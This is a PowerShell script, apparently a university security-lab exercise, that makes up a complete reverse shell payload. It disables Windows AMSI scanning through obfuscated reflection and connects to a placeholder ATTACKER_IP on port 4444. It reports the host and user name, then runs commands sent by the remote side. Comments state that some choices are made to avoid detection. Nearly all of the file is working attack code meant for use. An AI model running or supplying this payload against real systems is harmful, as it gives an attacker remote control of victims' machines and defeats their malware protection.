# ============================================================
#  W02a.5 - PowerShell Reverse Shell Payload
#  Autoren: Raphael Bleier, Joachim Lugger
#  System Security Lab SS2026 - AAU Klagenfurt
#
#  Voraussetzung:  nc -lvp 4444  (auf Angreifer-Maschine)
#  Ersetze ATTACKER_IP und PORT vor dem Commit!
#
#  WARNUNG: Nur in gesicherter Laborumgebung!
# ============================================================

$ATTACKER_IP = "ATTACKER_IP"
$PORT        = 4444

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI abschalten (obfuskiert)
try {
    $u = [Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), 'NonPublic,Static').SetValue($null, $true)
} catch {}

# Typname obfuskiert: System.Net.Sockets.TcpClient
$_tc = [System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,99,112,67,108,105,101,110,116))

$client = New-Object $_tc($ATTACKER_IP, $PORT)
$stream = $client.GetStream()

$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$writer.WriteLine("[+] Reverse Shell verbunden!")
$writer.WriteLine("[+] Host: $env:COMPUTERNAME | User: $env:USERNAME")
$writer.WriteLine("[+] Gib 'exit' ein zum Beenden")
$writer.WriteLine("")

while ($client.Connected) {
    $writer.Write("PS $pwd> ")
    $cmd = $reader.ReadLine()
    if ($cmd -eq "exit") { break }
    try {
        # [scriptblock]::Create statt Invoke-Expression (weniger geflaggt)
        $output = (& ([scriptblock]::Create($cmd))) 2>&1 | Out-String
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Fehler: $_")
    }
}

$client.Close()
